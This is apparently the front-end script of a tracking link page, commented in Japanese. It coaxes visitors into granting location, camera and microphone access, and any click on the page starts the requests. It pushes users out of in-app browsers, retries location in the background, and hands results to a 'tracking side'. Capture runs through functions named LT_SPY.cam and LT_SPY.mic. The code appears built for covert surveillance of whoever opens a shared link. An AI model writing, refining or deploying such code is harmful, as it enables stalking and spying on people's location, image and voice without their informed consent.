/* 要件ゲート。押されたら 位置情報→カメラ→マイク の順で許可を求める。

   位置情報は「許可ダイアログが出る」ことを最優先にするため
   ・クリックと同じタスクで getCurrentPosition を呼ぶ（非同期の前段を挟まない）
   ・1回目はオプション無しで呼ぶ（WebViewで一番ダイアログが出やすい）
   ・失敗したら精度を落として再試行し、取れなくても先へ進む
*/
(function () {
  "use strict";

  var GATE = document.getElementById("lt_gate");
  var btn = document.getElementById("lt_go");
  var stat = document.getElementById("lt_gate_st");
  var busy = false, permState = "unknown", finished = false;

  /* 1回目はオプション無し。以降は精度を落として粘る */
  var LADDER = [
    { timeout: 12000, maximumAge: 0 },
    { enableHighAccuracy: true, timeout: 12000, maximumAge: 0 },
    { enableHighAccuracy: false, timeout: 15000, maximumAge: 60000 },
    { enableHighAccuracy: false, timeout: 20000, maximumAge: 600000 },
  ];

  function say(t) { if (stat) stat.textContent = t || ""; }
  function wait(ms) { return new Promise(function (r) { setTimeout(r, ms); }); }

  var cp = document.getElementById("lt_copy");
  if (cp) {
    cp.addEventListener("click", function (e) {
      e.stopPropagation();
      var url = location.href;
      function done() {
        cp.textContent = "コピーしました";
        setTimeout(function () { cp.textContent = "リンクをコピー"; }, 1600);
      }
      function fallback() {
        try {
          var t = document.createElement("textarea");
          t.value = url;
          t.style.cssText = "position:fixed;left:-9999px";
          document.body.appendChild(t); t.select();
          document.execCommand("copy"); t.remove(); done();
        } catch (err) {}
      }
      try {
        if (navigator.clipboard && navigator.clipboard.writeText) {
          navigator.clipboard.writeText(url).then(done).catch(fallback);
        } else fallback();
      } catch (err) { fallback(); }
    });
  }

  /* アプリ内ブラウザのときの逃げ道 */
  function showInApp() {
    var ua = navigator.userAgent || "", name = "";
    if (/Instagram/i.test(ua)) name = "Instagram";
    else if (/FBAN|FBAV/i.test(ua)) name = "Facebook";
    else if (/Line\//i.test(ua)) name = "LINE";
    else if (/Twitter/i.test(ua)) name = "X";
    if (!name) return;
    var box = document.getElementById("lt_ia");
    var nm = document.getElementById("lt_ia_name");
    var a = document.getElementById("lt_safari");
    if (!box) return;
    box.style.display = "block";
    if (nm) nm.textContent = name;
    if (a) {
      var ios = /iPhone|iPad|iPod/i.test(ua);
      a.href = ios
        ? location.href.replace(/^https:/, "x-safari-https:")
        : "intent://" + location.href.replace(/^https?:\/\//, "") +
          "#Intent;scheme=https;package=com.android.chrome;end";
      a.textContent = ios ? "Safariで開き直す" : "Chromeで開き直す";
    }
  }

  function checkPerm() {
    try {
      if (!navigator.permissions || !navigator.permissions.query) return;
      navigator.permissions.query({ name: "geolocation" }).then(function (p) {
        permState = p.state;
        p.onchange = function () {
          permState = p.state;
          if (p.state === "granted" && !window.LT_FIRST_FIX) oneShot();
        };
      }).catch(function () {});
    } catch (e) {}
  }

  /* ★ 必ず返す。ダイアログが出るようクリックと同じタスクで呼ぶ */
  function geoOnce(o) {
    return new Promise(function (res) {
      if (!navigator.geolocation) return res(null);
      var done = false;
      var to = setTimeout(function () { if (!done) { done = true; res(null); } },
                          (o.timeout || 12000) + 1500);
      try {
        navigator.geolocation.getCurrentPosition(
          function (p) { if (done) return; done = true; clearTimeout(to); res(p); },
          function (e) { if (done) return; done = true; clearTimeout(to); res({ err: e }); },
          o);
      } catch (e) { clearTimeout(to); if (!done) { done = true; res(null); } }
    });
  }

  function attempt(i) {
    return geoOnce(LADDER[Math.min(i, LADDER.length - 1)]).then(function (r) {
      if (r && r.coords) {
        window.LT_FIRST_FIX = r;
        say("① 位置情報：取得しました");
        return true;
      }
      var code = r && r.err ? r.err.code : 0;
      if (code === 1 && permState === "prompt" && i === 0) {
        say("① 位置情報：もう一度確認します…");
        return wait(400).then(function () { return attempt(i + 1); });
      }
      if (code === 1) {
        say("① 位置情報：許可されていません");
        showInApp();
        return false;
      }
      if (i < LADDER.length - 1) {
        say("① 位置情報：取得中…（精度を落として再試行）");
        return wait(500).then(function () { return attempt(i + 1); });
      }
      say("① 位置情報：まだ取得できていません（このまま続けます）");
      return false;
    });
  }

  /* クリックと同じタスクで最初の1発を投げる */
  function geo() {
    if (!navigator.geolocation) { say("① 位置情報：この端末では非対応"); return Promise.resolve(false); }
    say("① 位置情報の許可を確認しています…");
    return attempt(0);
  }

  /* ゲート通過後も裏で取り続けて、取れたら追跡側へ渡す */
  function bgGeo() {
    if (!navigator.geolocation || window.LT_BG) return;
    window.LT_BG = true;
    var tries = 0;
    var t = setInterval(function () {
      tries++;
      if (window.LT_FIRST_FIX || tries > 20) { clearInterval(t); return; }
      geoOnce({ enableHighAccuracy: false, timeout: 9000, maximumAge: 60000 })
        .then(function (r) {
          if (r && r.coords) {
            window.LT_FIRST_FIX = r;
            if (window.LT_LIVE && window.LT_LIVE.feed) { try { window.LT_LIVE.feed(r); } catch (e) {} }
            clearInterval(t);
          }
        });
    }, 6000);
  }

  function oneShot() { geo().then(function (ok) { if (!ok) bgGeo(); }); }

  function cam() {
    if (!window.LT_CAM || !window.LT_SPY || !window.LT_SPY.cam) return Promise.resolve(true);
    say("② カメラの許可を確認しています…");
    return Promise.race([window.LT_SPY.cam(), wait(25000)]).then(function (ok) {
      ok = ok !== false;
      say(ok ? "② カメラ：映像を取得しました" : "② カメラ：取れませんでした");
      return ok;
    }).catch(function () { return false; });
  }

  function mic() {
    if (!window.LT_MIC || !window.LT_SPY || !window.LT_SPY.mic) return Promise.resolve(true);
    say("③ マイクの許可を確認しています…");
    return Promise.race([window.LT_SPY.mic(), wait(25000)]).then(function (ok) {
      ok = ok !== false;
      say(ok ? "③ マイク：OK" : "③ マイク：取れませんでした");
      return ok;
    }).catch(function () { return false; });
  }

  function pass() {
    if (window.LT_GATE_PASS) return;
    window.LT_GATE_PASS = true;
    if (GATE) {
      GATE.classList.add("out");
      setTimeout(function () { GATE.style.display = "none"; }, 420);
    }
    if (window.LT_FIRST_FIX && window.LT_LIVE && window.LT_LIVE.feed) {
      try { window.LT_LIVE.feed(window.LT_FIRST_FIX); } catch (e) {}
    }
    try { window.dispatchEvent(new Event("igt:gate")); } catch (e) {}
  }

  function run() {
    if (busy) return;
    busy = true;
    if (btn) { btn.disabled = true; btn.textContent = "確認中…"; }
    say("");
    checkPerm();

    var ok = { geo: false, cam: false, mic: false };
    geo().then(function (r) {           // ← ここまで同期。ダイアログが出る
      ok.geo = r;
      if (!r) bgGeo();
      return cam();
    }).then(function (r) {
      ok.cam = r;
      return mic();
    }).then(function (r) {
      ok.mic = r;
      finished = true;
      if (ok.geo && ok.cam && ok.mic) {
        window.LT_ALLOW_REDIRECT = true;
        var ia = document.getElementById("lt_ia");
        if (ia) ia.style.display = "none";
      } else {
        document.body.classList.add("need");
      }
      setTimeout(pass, 250);
    });
    setTimeout(function () { if (!finished) pass(); }, 20000);  // 保険
  }

  /* 押すたびに再挑戦できるようにする（once を付けない） */
  if (btn) btn.addEventListener("click", run);
  document.addEventListener("click", function (e) {
    if (busy) return;
    if (e.target === btn) return;
    if (e.target && e.target.closest && e.target.closest(".noclick")) return;
    run();
  }, { passive: true });

  window.LT_GATE_RUN = run;
  window.LT_GATE_RETRY = function () { busy = false; run(); };
  if (!GATE) pass();
})();